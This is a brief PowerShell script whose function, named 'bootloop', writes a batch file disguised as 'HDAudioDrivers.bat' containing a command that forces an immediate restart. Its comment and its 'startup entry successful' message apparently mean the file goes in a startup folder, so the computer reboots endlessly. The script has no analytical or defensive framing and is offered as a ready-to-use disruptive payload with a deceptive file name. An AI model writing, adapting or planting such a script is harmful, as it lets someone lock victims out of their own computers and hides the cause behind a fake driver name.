function bootloop {
    param (
        # Put your path between the quotes below!
        [string]$Path = "$env:USERPROFILE\Desktop" 
    )

    process {
        # ... the rest of the logic stays the same ...
        if (!(Test-Path -Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force | Out-Null
        }

        $FilePath = Join-Path -ChildPath "HDAudioDrivers.bat" -Path $Path
        "shutdown /r /t 0" | Out-File -FilePath $FilePath -Encoding ascii

        Write-Host "startup entry successful" -ForegroundColor Cyan
    }
}
bootloop
